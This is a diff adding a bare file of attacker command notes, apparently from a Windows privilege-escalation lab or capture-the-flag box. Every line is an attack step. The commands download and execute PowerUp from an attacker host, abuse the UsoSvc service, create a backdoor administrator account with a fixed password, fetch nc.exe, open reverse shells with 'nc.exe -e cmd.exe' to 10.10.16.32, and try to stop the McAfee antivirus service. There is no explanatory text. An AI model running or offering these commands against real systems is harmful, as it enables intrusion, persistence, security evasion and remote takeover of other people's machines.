@@ -1,0 +1,23 @@
+powershell.exe powerup.ps1
+powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.32:8000/powerup.ps1'); Invoke-AllChecks" > test.txt
+C:\Windows\system32\svchost.exe -k netsvcs -p
+
+Invoke-ServiceAbuse -Name 'UsoSvc'
+powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.32:8000/powerup.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' ls
+
+net user john Password123! /add && net localgroup Administrators john /add
+
+runas /noprofile /user:john cmd.exe
+
+
+powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.32:8000/powerup.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'C:\Users\Public\Documents\nc.exe 10.10.16.32 9876 -e cmd.exe'
+
+powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.32:8000/powerup.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'move C:\System32\spool\drivers\color\nc.exe C:/Users/Public/Documents/nc.exe'
+
+powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.32:8000/powerup.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'curl http://10.10.16.32:8000/nc.exe --output nc.exe'
+
+powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.32:8000/powerup.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'net stop "McAfee McShield"'
+
+powershell.exe Invoke-WebRequest -Uri 'http://10.10.16.32:8000/nc.exe' -OutFile 'C:\Users\Public\Documents\nc.exe'
+
+powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.32:8000/powerup.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'C:\Users\Public\Documents\nc.exe 10.10.16.32 8888 -e cmd.exe'
